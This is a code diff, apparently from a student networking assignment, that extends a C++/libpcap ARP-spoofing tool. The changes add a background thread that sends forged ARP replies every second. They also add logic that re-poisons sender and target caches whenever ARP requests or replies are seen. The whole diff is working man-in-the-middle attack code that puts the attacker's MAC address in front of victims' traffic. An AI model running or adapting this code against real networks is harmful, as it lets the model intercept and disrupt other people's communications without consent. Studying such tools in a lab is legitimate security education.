@@ -3,6 +3,8 @@
 #include <iostream>
 #include <cstring>
 #include <map>
+#include <thread>
+#include <chrono>
 
 #include "ethhdr.h"
 #include "arphdr.h"
@@ -84,7 +86,8 @@ Mac send_arp_normal(Ip targetIp){
 
 //send arp-spoof packet
 void send_arp_spoof(Mac senderMac, Ip senderIp, Ip targetIp){
-	printf("sent to.. %s", static_cast<string>(senderMac).c_str());
+	// printf("sent to.. %s\n", static_cast<string>(senderMac).c_str());
+	
 	EthArpPacket packet;
 	packet.eth_.smac_ = attackerMac;
 	packet.eth_.dmac_ = senderMac;
@@ -113,6 +116,18 @@ void send_arp_spoof(Mac senderMac, Ip senderIp, Ip targetIp){
 	return;
 }
 
+void arp_spoofing_thread(Mac senderMac, Ip senderIp, Ip targetIp) {
+
+	printf("create spoofing thread for %s, %s, \n", 
+		static_cast<string>(senderIp).c_str(),
+		static_cast<string>(targetIp).c_str());
+
+	while (true) {
+		send_arp_spoof(senderMac, senderIp, targetIp);
+		this_thread::sleep_for(chrono::seconds(1)); // Wait for 1 second
+	}
+}
+
 int main(int argc, char* argv[]) {
 	if (argc < 4 || (argc - 2) % 2 != 0) {
 		usage();
@@ -133,43 +148,54 @@ int main(int argc, char* argv[]) {
 	string interface = interf;
 
 	// Network, ARPEntry 
-	map<Ip, Mac> Network;
+	pair<Ip, Mac> Attacker;
+	map<Ip, Mac> SenderNet;
+	map<Ip, Mac> TargetNet;
 	map<Ip, Ip> ARPEntry;
 
 	attackerMac = get_mac(interface);
 	attackerIp = get_ip(interface);
-	Network.insert(make_pair(attackerIp, attackerMac));
+	Attacker = (make_pair(attackerIp, attackerMac));
 
 	// Process each (Sender, Target) pair
 	for (int i = 2; i < argc; i += 2) {
 		Ip senderIp = Ip(argv[i]);      // Sender IP
-		//ARPEntry에 있는 IP인지 확인
-		if(Network.find(senderIp)==Network.end()){
-			Mac senderMac = send_arp_normal(senderIp);
-			Network.insert(make_pair(senderIp, senderMac));
+		Mac senderMac;
+		//이미 입력된 IP인지 확인
+		if(SenderNet.find(senderIp)==SenderNet.end()){
+			senderMac = send_arp_normal(senderIp);
+			SenderNet.insert(make_pair(senderIp, senderMac));
+		}
+		// TargetNet에 있으면
+		else if(TargetNet.find(senderIp)!=TargetNet.end()){
+			senderMac = TargetNet[senderIp];
+			SenderNet.insert(make_pair(senderIp, senderMac));
 		}
 
 		Ip targetIp = Ip(argv[i + 1]); // Target IP
+		Mac targetMac;
 		//ARPEntry에 있는 IP인지 확인
-		if(Network.find(targetIp)==Network.end()){
-			Mac targetMac = send_arp_normal(targetIp);
-			Network.insert(make_pair(targetIp, targetMac));
+		if(TargetNet.find(targetIp)==TargetNet.end()){
+			targetMac = send_arp_normal(targetIp);
+			TargetNet.insert(make_pair(targetIp, targetMac));
+		}
+		// SenderNet에 있으면
+		else if(SenderNet.find(senderIp)!=SenderNet.end()){
+			targetMac = SenderNet[targetIp];
+			TargetNet.insert(make_pair(targetIp, targetMac));
 		}
 
 		ARPEntry.insert(make_pair(senderIp, targetIp));
 
-		send_arp_spoof(Network[senderIp], senderIp, targetIp);
-		printf("sent arp spoof\n");
+		send_arp_spoof(SenderNet[senderIp], senderIp, targetIp);
+		// printf("sent arp spoof\n");
+
+		thread spoofThread(arp_spoofing_thread, senderMac, senderIp, targetIp);
+		
+		spoofThread.detach();
 	}
 
 	while(true){
-		// int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-		// //printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", senderIp.c_str(), targetIp.c_str());
-		// if (res != 0) {
-		// 	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-		// }
-
-
 		const u_char* cap_packet;
 		struct pcap_pkthdr* header;
 		
@@ -191,31 +217,44 @@ int main(int argc, char* argv[]) {
 			// if sender and target ip not in the Network 
 
 			Ip senderIp = arp_hdr->sip();
-			Mac senderMac = Network[senderIp];
+			Mac senderMac = SenderNet[senderIp];
 			Ip targetIp = arp_hdr->tip();
 
-			if(Network.find(senderIp)==Network.end() && Network.find(targetIp)==Network.end()) continue;
+			// 저장하고있는 ip에서 src, dst가 하나도 해당되지 않으면 
+			if(SenderNet.find(senderIp)==SenderNet.end() && TargetNet.find(targetIp)==TargetNet.end()) continue;
 
-			if(arp_hdr->tmac().isBroadcast()){
-				send_arp_spoof(Network[senderIp], senderIp,targetIp);
-			}
+			
 			// sip가 센더로 저장되어있고 tip가 센더에 해당되는 ip가 아니라면 continue
 			// sip가 제대로 통신할 수 있도록 ARP 리퀘스트는 해야함
-			if(Network.find(senderIp)!=Network.end() && ARPEntry[senderIp]!=targetIp) continue;
-		
+			if(SenderNet.find(senderIp)!=SenderNet.end() && ARPEntry[senderIp]!=targetIp) continue;
+
+			// Sender and Target's Request "Who are you??"
+			if(arp_hdr->tmac().isBroadcast() && (SenderNet.find(senderIp)!=SenderNet.end()||TargetNet.find(senderIp)!=TargetNet.end())){
+				send_arp_spoof(SenderNet[senderIp], senderIp, targetIp);
+			}
+
+			// target's reply "You.. Gateway is ME"
+			if(arp_hdr->op()==ArpHdr::Reply&&SenderNet.find(targetIp)!=SenderNet.end()){
+				send_arp_spoof(SenderNet[targetIp], targetIp,senderIp);
+			}
+
 			// sip가 센더혹은 타겟이면서 sip가 센더일 때 tip가 센더의 타켓이 아닌 패킷만 남음
 			// 타겟의 ARP 받으면 무조건 ARP 날리기	
 
-			send_arp_spoof(Network[senderIp], senderIp,targetIp);
-			printf("sent arp spoof2\n");
+			send_arp_spoof(SenderNet[senderIp], senderIp,targetIp);
 		}
 
 		//ARP가 아닌데 sip가 센더Ip면
-
-	
-		//check ARP Packet
 		if (ntohs(eth_arp_pkt->eth_.type_) != EthHdr::Arp) continue;
 		const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);
+
+		// int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+		// //printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", senderIp.c_str(), targetIp.c_str());
+		// if (res != 0) {
+		// 	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		// }
+
+
 
 		// 공격 대상의 sender의 ARP 패킷이면
 		// 센더 - 어택 -> 타겟 브로드 relay
